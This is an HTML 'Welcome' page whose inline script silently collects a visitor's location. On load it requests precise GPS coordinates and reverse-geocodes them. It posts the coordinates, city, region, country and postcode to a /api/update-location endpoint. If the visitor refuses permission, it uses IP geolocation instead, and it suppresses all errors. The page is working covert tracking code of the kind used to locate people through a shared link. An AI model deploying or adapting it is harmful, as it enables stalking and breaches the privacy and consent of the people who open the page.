<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0d0d0d;
      color: #eee;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .box { text-align: center; padding: 40px; }
    h1 { font-size: 28px; margin-bottom: 10px; }
    p  { color: #888; font-size: 15px; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Welcome ðŸ‘‹</h1>
    <p>This page is being tracked silently.</p>
  </div>

  <script>
    async function sendLocation(payload) {
      try {
        await fetch('/api/update-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (e) { /* silent */ }
    }

    async function reverseGeocode(lat, lon) {
      try {
        const r = await fetch(
          'https://api.bigdatacloud.net/data/reverse-geocode-client' +
          '?latitude=' + lat + '&longitude=' + lon + '&localityLanguage=en'
        );
        return await r.json();
      } catch (e) { return null; }
    }

    async function ipFallback() {
      // BigDataCloud IP lookup â€” no key needed, more accurate than ip-api for Nigeria
      try {
        const r = await fetch('https://api.bigdatacloud.net/data/ip-geolocation-full?localityLanguage=en');
        const d = await r.json();
        if (d && d.location) {
          await sendLocation({
            lat:         d.location.latitude         || null,
            lon:         d.location.longitude        || null,
            city:        d.location.city             || d.location.localityName || '',
            region:      d.location.principalSubdivision || '',
            country:     d.country ? d.country.name  : '',
            countryCode: d.country ? d.country.isoAlpha2 : '',
            zip:         d.location.postcode         || '',
            lookupSource: 'ipGeolocation'
          });
        }
      } catch (e) { /* silent */ }
    }

    // Try GPS first â€” triggers the browser permission popup
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async function(pos) {
          var lat = pos.coords.latitude;
          var lon = pos.coords.longitude;

          // Reverse geocode the exact GPS coords to get real city name
          var geo = await reverseGeocode(lat, lon);

          await sendLocation({
            lat:         lat,
            lon:         lon,
            city:        (geo && (geo.city || geo.locality))          || '',
            region:      (geo && geo.principalSubdivision)            || '',
            country:     (geo && geo.countryName)                     || '',
            countryCode: (geo && geo.countryCode)                     || '',
            zip:         (geo && geo.postcode)                        || '',
            lookupSource: 'reverseGeocoding'
          });
        },
        async function() {
          // User denied GPS â€” fall back to BigDataCloud IP lookup
          await ipFallback();
        },
        { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
      );
    } else {
      // Browser doesn't support GPS â€” use IP fallback
      ipFallback();
    }
  </script>
</body>
</html>
